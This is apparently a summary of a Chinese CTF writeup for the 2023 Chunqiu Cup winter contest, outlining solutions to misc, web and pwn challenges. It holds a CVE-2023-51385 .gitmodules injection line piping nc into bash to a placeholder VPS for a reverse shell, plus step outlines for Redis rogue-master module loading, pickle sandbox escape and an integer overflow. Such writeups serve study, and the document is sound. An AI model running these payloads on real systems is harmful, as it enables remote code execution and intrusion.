---
title: 2023 年春秋杯网络安全联赛冬季赛 Writeup
contest: 春秋杯冬季赛 2023
year: 2023
difficulty: hard
vuln_type: web_unknown
tags: [外卖ZIP名隐写, 明文爆破, PHP混淆还原, CVE-2023-51385_OpenSSH_ProxyCommand, Redis主从复制, dict协议, Python格式化字符串漏洞, 沙盒bypass]
attack_chain:
  - 谁偷吃了我的外卖: foremost 分离图片 → 排序 ZIP 内 _ 后 4 字符 → base64 → 补 PK 文件头 → 明文爆破
  - 明文混淆: LICENSE.txt 明文爆破 + PHP urldecode/eval 混淆还原
  - modules: CVE-2023-51385 OpenSSH ProxyCommand 注入，.gitmodules url 字段 nc bash
  - ezezez_php: PHP 反序列化 POP 链 + Redis 主从复制 + dict:// 协议 RCE
  - 构造 Er__set → $value($this->Flag) 调用系统函数
  - picup: Python 格式化字符串漏洞 + pickle.loads 反序列化沙盒 bypass
  - 伪造 admin session + 上传 .pkl 文件
  - nmanager: 整数溢出 + 栈任意读写 + 泄露 libc 改 main 返回
key_payload: 'CVE-2023-51385: .gitmodules url=ssh://`nc VPS 3333|bash|nc VPS 3334`foo'
one_liner: 春秋杯冬季赛综合：外卖 ZIP 隐写+明文爆破+OpenSSH ProxyCommand+Redis 主从复制+Python pickle 沙盒。
lesson: CVE-2023-51385 走 .gitmodules 注入 nc|bash；Redis 主从复制 + dict:// 协议是 SSRF 经典 RCE；Python 格式化字符串漏洞可泄露 admin 密码。
quality: high
---

# 2023 年春秋杯网络安全联赛冬季赛 Writeup

## 来源
- 原文：ctfiot.com/158635.html

## 6+ 道题详解

### MISC
1. **谁偷吃了我的外卖**
   - foremost 分离图片
   - ZIP 内 _ 后 4 字符排序拼接 base64
   - 补 PK 文件头 → 明文爆破
   - flag: `flag{W1sh_y0u_AaaAaaaaaaaaaaa_w0nderfu1_CTF_journe9}`

2. **明文混淆**
   - LICENSE.txt 明文爆破
   - urldecode + eval 还原
   ```php
   $O00OO0 = urldecode("%6E1%7A%62...");
   $O00O0O = $O00OO0{3}...;
   eval($O00O0O("..."));
   ```

3. **modules**（CVE-2023-51385 OpenSSH ProxyCommand）
   ```.gitmodules
   [submodule "cve"]
       path = cve
       url = ssh://`nc VPS 3333|bash|nc VPS 3334`foo.ichunqiu.com/bar
   ```
   - 服务器监听 3333 和 3334 端口
   - 反向 shell 取 flag

### WEB
4. **ezezez_php**（PHP 反序列化 + Redis 主从复制）
   - POP 链：Ha__destruct → Rd__call → Er__set → $value($this->Flag)
   - dict://127.0.0.1:6379 协议触发 Redis 命令
   - 主从复制：slaveof VPS:2222 + module load ./exp.so
   - 加载恶意 .so 执行 env 拿 flag
   - 参考：https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server

5. **picup**（Python 格式化字符串漏洞 + pickle）
   - 注册账号返回加密数据
   - 格式化字符串：`{users.passwords}` 泄露 admin 密码
   - 伪造 admin session
   - 上传 .pkl 文件触发 pickle.loads
   - WAF 绕过：[字符黑名单] -> 沙盒 bypass

### PWN
6. **nmanager**（整数溢出 + 栈任意读写）
   - key 验证：rax*8 整数溢出 = 0x60
   - 覆盖 ch1 为 valid 绕过登录
   - 泄露 libc → 控制 main 返回为 start
   - 重新执行一遍 getshell

## 关键技巧
- **CVE-2023-51385**：OpenSSH ProxyCommand 未过滤 %h/%p
- **Redis 主从复制**：dict:// 协议触发 SSRF + 加载 .so
- **Python 格式化字符串漏洞**：双重 format() 调用泄露内部状态
- **整数溢出**：rax 赋 0x800000000000000c 让 *8 溢出为 0x60
- **明文爆破**：已知 12 字节 LICENSE.txt 用 zip 工具爆破

## 适用场景
- 真实 CVE 实战（CVE-2023-51385）
- Redis 主从复制 SSRF RCE
- Python pickle 沙盒 bypass
- 整数溢出绕过登录
- PHP 混淆代码还原
